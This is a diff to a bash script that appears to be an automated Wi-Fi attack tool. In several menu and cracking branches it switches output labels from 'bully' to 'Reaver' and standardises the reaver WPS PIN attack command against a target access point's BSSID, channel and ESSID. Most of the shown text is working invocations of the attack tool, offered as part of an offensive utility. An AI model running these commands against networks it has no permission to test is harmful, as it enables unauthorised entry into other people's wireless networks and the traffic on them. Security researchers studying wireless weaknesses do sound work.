@@ -1662,19 +1662,21 @@ CRACKING_PROCESS() {
 															elif [ $hash_bully -eq 0 ]
 															     then
 										                             echo ""
-										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
+										                             echo -e "$White [+] Running$Green Reaver$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
-										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN 
+										                             echo -e -n "$BYellow"
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
 										                             PID="$!"
-										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
-										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
+										                             Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
+										                             End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
 										                             Loading
 										                             
 																 else
 																     echo ""
 																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 																	 echo ""
-																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN 
+																	 echo -e -n "$BYellow"
+																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
 																	 PID="$!"
 																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
 																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
@@ -2489,18 +2491,20 @@ case $menu in
 						   						            if [ $hash_bully -eq 0 ]
 															     then
 										                             echo ""
-										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
+										                             echo -e "$White [+] Running$Green Reaver$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
-										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN 
+										                             echo -e -n "$BYellow"
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
 										                             PID="$!"
-										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
-										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
+										                             Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
+										                             End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
 										                             Loading
 										                             else
 																     echo ""
 																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 																	 echo ""
-																	 reaver -i $mon -b $BSSID -c $CHANNEL -e -n -vv -p $PIN
+																	 echo -e -n "$BYellow"
+																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
 																	 PID="$!"
 																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
 																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
@@ -2547,16 +2551,18 @@ case $menu in
 						   if [ $hash_bully -eq 0 ]
 								then
 									echo ""
-									echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
+									echo -e "$White [+] Running$Green Reaver$White with the correct$Green PIN$White, wait ..."
 									echo ""
-									reaver -i $mon -b $BSSID -c $CHANNEL -vv -e "$ESSID" -p $PIN
+									echo -e -n "$BYellow"
+									reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
 									echo -e "$Yellow [+]$Green Congratulation (^_^) "
 									echo ""
 								else
 									echo ""
 									echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 									echo ""
-									reaver -i $mon -b $BSSID -c $CHANNEL -vv -e "$ESSID" -p $PIN
+									echo -e -n "$BYellow"
+									reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
 									echo -e "$Yellow [+]$Green Congratulation (^_^) "
 									echo ""
 							fi
